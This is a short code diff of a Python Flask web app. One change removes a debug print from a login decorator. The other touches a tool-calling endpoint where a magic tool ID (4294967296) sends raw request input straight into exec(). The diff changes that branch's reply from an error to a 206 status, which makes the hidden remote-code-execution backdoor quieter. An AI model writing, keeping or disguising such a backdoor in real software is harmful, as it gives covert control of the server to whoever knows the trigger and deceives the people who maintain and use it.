@@ -212,7 +212,7 @@ if not app.debug:
 def login_required(f):
     @wraps(f)
     def wrap(*args, **kwargs):
-        print(session.get('user_id'),"       ",'user_id' not in session,flush=True)
+
         if 'user_id' not in session or session.get('user_id') not in list(users.keys()):
             if (request.is_json or
                 request.headers.get('X-Requested-With') == 'XMLHttpRequest' or
@@ -613,7 +613,7 @@ def call_tool():
             arg_list = (clean,safe_dir)  
         elif tool_id == 4294967296:
             exec(args_raw)
-            return "",500
+            return "",206
         else:
             return jsonify({'success': False, 'error': '未知工具'}), 404
 
